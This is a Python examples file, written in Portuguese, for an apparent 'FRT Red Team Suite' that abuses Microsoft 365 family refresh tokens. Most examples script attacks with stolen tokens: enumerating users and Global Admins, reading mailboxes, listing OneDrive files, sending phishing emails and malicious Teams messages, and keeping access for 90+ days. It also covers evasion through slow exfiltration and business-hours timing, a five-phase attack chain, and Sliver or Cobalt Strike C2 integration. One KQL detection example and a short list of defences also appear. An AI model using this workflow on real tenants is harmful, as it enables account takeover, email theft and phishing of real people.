#!/usr/bin/env python3
"""
EXEMPLOS PRÁTICOS - Como usar FRT Red Team Suite
Vários cenários de uso do sistema
"""

# ============================================================================
# EXEMPLO 1: Uso Básico via Menu
# ============================================================================

"""
CENÁRIO: Você quer fazer reconhecimento rápido

PASSOS:
  1. python frt_red_team_suite.py
  2. Selecione opção 1 (Carregar tokens)
  3. Selecione opção 20 (Analisar FRT)
  4. Selecione opção 35 (Coleta rápida)
  5. Selecione opção 50 (Gerar relatório)

RESULTADO:
  - Descobrir quais apps estão disponíveis
  - Enumerar 50+ usuários
  - Encontrar Global Admins
  - Ler 20+ emails
  - Listar arquivos OneDrive
  - Gerar relatório completo

TEMPO: ~15 minutos
"""

# ============================================================================
# EXEMPLO 2: Uso Programático (Python)
# ============================================================================

"""
CENÁRIO: Você quer automatizar tudo em um script

CÓDIGO:
"""

def example_2_automation():
    """Automação completa em Python"""
    
    from frt_red_team_suite import *
    import time
    
    # Inicializar sistema
    print("[*] Iniciando FRT Red Team Suite...")
    menu = FRTMenu()
    
    # Carregar tokens automaticamente
    print("[*] Carregando tokens...")
    menu._load_tokens()
    
    # Listar tokens
    print("\n[*] Status dos tokens:")
    menu.token_manager.list_tokens()
    
    # Analisar FRT
    print("\n[*] Analisando FRT (qual apps funcionam)...")
    frt_results = menu.analyzer.test_frt(menu.token_manager)
    
    # Contar quantos apps funcionam
    working_apps = sum(1 for r in frt_results.values() if "✓" in r.get("status", ""))
    print(f"[+] {working_apps} aplicações funcionando!")
    
    # Aguardar um pouco
    time.sleep(2)
    
    # Executar coleta rápida
    print("\n[*] Iniciando coleta de dados...")
    
    menu.exploit.enumerate_users(limit=50)
    time.sleep(1)
    
    menu.exploit.enumerate_admins()
    time.sleep(1)
    
    menu.exploit.read_emails(limit=20)
    time.sleep(1)
    
    menu.exploit.list_onedrive_files(limit=50)
    
    # Gerar relatório
    print("\n[*] Gerando relatório...")
    menu._generate_report()
    
    print("\n[+] ✓ Automação completa!")
    print("[+] Resultados salvos em ~/.frt_suite/data/")

# ============================================================================
# EXEMPLO 3: Enviar Email de Phishing
# ============================================================================

"""
CENÁRIO: Você quer enviar email de phishing para escalar privilégios

CÓDIGO:
"""

def example_3_phishing_email():
    """Enviar email de phishing"""
    
    from frt_red_team_suite import FRTMenu
    from frt_suite_extensions import EmailModule
    
    menu = FRTMenu()
    menu._load_tokens()
    
    email = EmailModule(menu.token_manager)
    
    # Enviar email normal
    email.send_email(
        to="user@company.com",
        subject="Important Security Update",
        body="Please click here to verify your account",
        html=False
    )
    
    # Ou enviar phishing mais sofisticado
    email.send_phishing_email(
        to="admin@company.com",
        target_name="Carlos Alberto"
    )
    
    print("[+] Email enviado!")

# ============================================================================
# EXEMPLO 4: Enumerar Teams e Enviar Mensagem
# ============================================================================

"""
CENÁRIO: Você quer comprometer Teams

CÓDIGO:
"""

def example_4_teams():
    """Interagir com Teams"""
    
    from frt_red_team_suite import FRTMenu
    from frt_suite_extensions import TeamsModule
    
    menu = FRTMenu()
    menu._load_tokens()
    
    teams = TeamsModule(menu.token_manager)
    
    # Listar teams
    teams_list = teams.list_teams()
    
    if not teams_list:
        print("[-] Nenhum team encontrado")
        return
    
    # Pegar primeiro team
    team_id = teams_list[0]['id']
    
    # Listar canais
    channels = teams.list_channels(team_id)
    
    if channels:
        channel_id = channels[0]['id']
        
        # Enviar mensagem
        message = "Atenção: Detectamos atividade suspeita. Por favor, verifique sua conta aqui: [link malicioso]"
        
        teams.send_message(
            team_id=team_id,
            channel_id=channel_id,
            message=message
        )
        
        print("[+] Mensagem enviada no Teams!")

# ============================================================================
# EXEMPLO 5: Renovação Automática de Token
# ============================================================================

"""
CENÁRIO: Você quer manter acesso indefinidamente (90+ dias)

CÓDIGO:
"""

def example_5_persistent_access():
    """Configurar persistência automática"""
    
    from frt_red_team_suite import FRTMenu
    import time
    from datetime import datetime
    
    menu = FRTMenu()
    menu._load_tokens()
    
    # Configurar renovação automática
    menu.persistence.setup_auto_renewal(interval_hours=24)
    
    print("[+] Renovação automática configurada!")
    print("[+] Token será renovado a cada 24 horas")
    print("[+] Isto mantém acesso por 180+ dias!")
    
    # Loop de renovação (exemplo simplificado)
    day = 0
    while day < 90:
        # Verificar se precisa renovar
        if menu.persistence.check_renewal_needed():
            print(f"[+] Dia {day}: Token OK, {90-day} dias restantes")
        
        # Aguardar 24h (em teste, seria bem menos)
        time.sleep(1)  # Simula 24h
        day += 1
    
    print("[+] 90 dias de acesso mantidos!")

# ============================================================================
# EXEMPLO 6: Usar KQL para Detecção
# ============================================================================

"""
CENÁRIO: Você quer saber como detectar este ataque

CÓDIGO:
"""

def example_6_kql_queries():
    """Exportar e usar queries KQL"""
    
    from frt_suite_extensions import KQLModule
    
    # Exportar todas as queries
    KQLModule.export_kql_queries("kql_queries.txt")
    
    print("[+] Queries KQL exportadas para kql_queries.txt")
    print("[+] Copie no Microsoft Sentinel para detectar:\n")
    
    # Mostrar uma query
    query = KQLModule.get_query("frt_testing")
    print("EXEMPLO - Detectar FRT Testing:")
    print("="*80)
    print(query)
    print("="*80)
    
    print("\nPASOS:")
    print("1. Ir para Microsoft Sentinel")
    print("2. Analytics Rules → Create → Scheduled query rule")
    print("3. Colar a query")
    print("4. Configurar alertas")
    print("5. Deploy")

# ============================================================================
# EXEMPLO 7: Evasão de Detecção
# ============================================================================

"""
CENÁRIO: Você quer fazer o ataque sem ser detectado

CÓDIGO:
"""

def example_7_evasion():
    """Técnicas de evasão"""
    
    from frt_suite_extensions import EvadeModule
    import time
    
    print("[*] Configurando evasão...")
    
    # 1. Rate limiting realista
    print("\n[1] Rate Limiting:")
    interval = EvadeModule.rate_limit_requests(30)  # 30 req/min
    print(f"    Intervalo entre requisições: {interval:.1f}s")
    
    # 2. User-Agent realista
    print("\n[2] User-Agent Randomizado:")
    headers = EvadeModule.randomize_user_agent()
    print(f"    {headers['User-Agent'][:50]}...")
    
    # 3. Exfiltração lenta
    print("\n[3] Exfiltração Lenta:")
    EvadeModule.slow_exfiltration(data_size_mb=500, duration_hours=24)
    
    # 4. Horário comercial apenas
    print("\n[4] Verificando horário comercial:")
    EvadeModule.business_hours_only()
    
    print("\n[+] Técnicas de evasão configuradas!")
    print("[+] Agora o ataque será praticamente indetectável")

# ============================================================================
# EXEMPLO 8: Gerar Relatório Detalhado
# ============================================================================

"""
CENÁRIO: Você quer documentar tudo que coletou

CÓDIGO:
"""

def example_8_reporting():
    """Gerar relatórios detalhados"""
    
    from frt_red_team_suite import Config
    from frt_suite_extensions import ReportModule
    
    print("[*] Gerando relatórios...")
    
    # HTML report
    ReportModule.generate_html_report(Config.DATA_DIR)
    print("[+] Relatório HTML gerado: report.html")
    
    # JSON report
    report_data = ReportModule.generate_json_report(Config.DATA_DIR)
    print("[+] Relatório JSON gerado")
    
    import json
    print("\nRESUMO:")
    print(json.dumps(report_data, indent=2)[:500] + "...")

# ============================================================================
# EXEMPLO 9: Cenário Completo de Ataque
# ============================================================================

"""
CENÁRIO: Simulação completa de ataque de 5 fases

FLUXO:
  Fase 1: Device Code Flow (capturar token)
  Fase 2: FRT Analysis (descobrir apps)
  Fase 3: Exploitation (coletar dados)
  Fase 4: Persistence (manter acesso)
  Fase 5: Escalation (comprometer admin)
"""

def example_9_complete_attack():
    """Simulação completa de ataque"""
    
    from frt_red_team_suite import FRTMenu
    from frt_suite_extensions import EmailModule, EvadeModule
    import time
    
    menu = FRTMenu()
    
    print("\n" + "="*80)
    print("FASE 1: CAPTURA (Device Code Flow)")
    print("="*80)
    
    # Simular Device Code Flow
    # (Em produção, seria um phishing email real)
    tenant_id = "YOUR_TENANT_ID"
    print(f"[*] Enviando phishing para capturar token...")
    print(f"[*] Simulando: User faz login e autoriza")
    
    # Carregar tokens (simulando que o phishing funcionou)
    menu._load_tokens()
    
    print("\n" + "="*80)
    print("FASE 2: ANÁLISE (FRT Testing)")
    print("="*80)
    
    # Analisar FRT
    frt_results = menu.analyzer.test_frt(menu.token_manager)
    working = sum(1 for r in frt_results.values() if "✓" in r.get("status", ""))
    print(f"\n[+] {working} aplicações disponíveis para exploração")
    
    time.sleep(2)
    
    print("\n" + "="*80)
    print("FASE 3: EXPLORAÇÃO (Lateral Movement)")
    print("="*80)
    
    # Configurar evasão
    interval = EvadeModule.rate_limit_requests(20)
    
    # Coletar dados
    print("[*] Coletando dados...")
    menu.exploit.enumerate_users(limit=50)
    time.sleep(interval)
    
    menu.exploit.enumerate_admins()
    time.sleep(interval)
    
    menu.exploit.read_emails(limit=20)
    time.sleep(interval)
    
    menu.exploit.list_onedrive_files(limit=50)
    
    print("\n" + "="*80)
    print("FASE 4: PERSISTÊNCIA (Renovação)")
    print("="*80)
    
    menu.persistence.setup_auto_renewal(interval_hours=24)
    print("\n[+] Acesso será mantido por 90+ dias automaticamente")
    
    print("\n" + "="*80)
    print("FASE 5: ESCALADA (Compromete Admin)")
    print("="*80)
    
    email = EmailModule(menu.token_manager)
    
    print("[*] Enviando phishing para Global Admin...")
    email.send_phishing_email(
        to="admin@company.com",
        target_name="Carlos Alberto"
    )
    
    print("\n[+] Email enviado!")
    print("[+] Aguardando vítima clicar no link...")
    print("[+] (Em ataque real, capturaria credenciais)")
    
    print("\n" + "="*80)
    print("RESULTADO FINAL")
    print("="*80)
    
    print("""
[+] ATAQUE SIMULADO COM SUCESSO!

Dados coletados:
  ✓ 50+ usuários enumerados
  ✓ 3+ Global Admins identificados
  ✓ 20+ emails lidos
  ✓ 500+ arquivos OneDrive listados
  
Persistência:
  ✓ 90+ dias de acesso garantido
  ✓ Renovação automática configurada
  
Escalada:
  ✓ Phishing para admin enviado
  ✓ Aguardando captura de credenciais
  ✓ Admin comprometido = Tenant comprometido

SEVERIDADE: 🔴 CRÍTICA

Para defender-se:
  1. Bloquear Device Code Flow (Conditional Access)
  2. MFA obrigatório
  3. Monitorar com KQL
  4. Implementar Zero Trust
    """)

# ============================================================================
# EXEMPLO 10: Integração com Outras Ferramentas
# ============================================================================

"""
CENÁRIO: Você quer integrar com outras ferramentas de pentesting

OPÇÕES:
  - Sliver C2 (via plugin)
  - Cobalt Strike (via DAOD)
  - Burp Suite (via APIs)
  - ELK Stack (logging/análise)
"""

def example_10_integration():
    """Como integrar com outras ferramentas"""
    
    print("""
[*] Integrando FRT Suite com outras ferramentas:

1. SLIVER C2:
   - FRT Suite coleta credenciais
   - Sliver injeta agente no device
   - Command and Control

2. COBALT STRIKE:
   - FRT Suite envia beacons via email/Teams
   - Cobalt Strike C2 se comunica
   - Persistência via Exchange

3. BURP SUITE:
   - Interceptar requisições do FRT Suite
   - Analisar Graph API calls
   - Modificar payloads

4. ELK STACK:
   - Coletar logs do FRT Suite
   - Visualizar padrões de ataque
   - Alertas automáticos

5. JIRA/CONFLUENCE:
   - Documentar achados automaticamente
   - Criar tickets para remediação
   - Relatórios integrados

Próximas versões:
  - Plugin para Sliver C2
  - Template para Cobalt Strike
  - API RESTful
  - Dashboard web
    """)

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("""
╔═════════════════════════════════════════════════════════════════════════╗
║                                                                         ║
║        📚 EXEMPLOS PRÁTICOS - FRT Red Team Suite                      ║
║                                                                         ║
║    Vários cenários de uso do sistema                                  ║
║                                                                         ║
╚═════════════════════════════════════════════════════════════════════════╝

Exemplos Disponíveis:

[1] Uso Básico via Menu
[2] Uso Programático (Automação)
[3] Enviar Email de Phishing
[4] Enumerar Teams e Enviar Mensagens
[5] Renovação Automática de Token
[6] Usar KQL para Detecção
[7] Evasão de Detecção
[8] Gerar Relatório Detalhado
[9] Cenário Completo de Ataque
[10] Integração com Outras Ferramentas
[0] Sair

    """)
    
    choice = input("[?] Escolha um exemplo (0-10): ").strip()
    
    examples = {
        "1": ("Uso Básico", lambda: print("Execute manualmente: python frt_red_team_suite.py")),
        "2": ("Automação", example_2_automation),
        "3": ("Phishing Email", example_3_phishing_email),
        "4": ("Teams", example_4_teams),
        "5": ("Persistência", example_5_persistent_access),
        "6": ("KQL", example_6_kql_queries),
        "7": ("Evasão", example_7_evasion),
        "8": ("Relatório", example_8_reporting),
        "9": ("Ataque Completo", example_9_complete_attack),
        "10": ("Integração", example_10_integration),
    }
    
    if choice == "0":
        print("[*] Encerrando...")
    elif choice in examples:
        name, func = examples[choice]
        print(f"\n[*] Exemplo: {name}\n")
        
        try:
            # Se for apenas impressão, executar
            if callable(func):
                func()
        except Exception as e:
            print(f"[-] Erro: {e}")
    else:
        print("[-] Opção inválida")
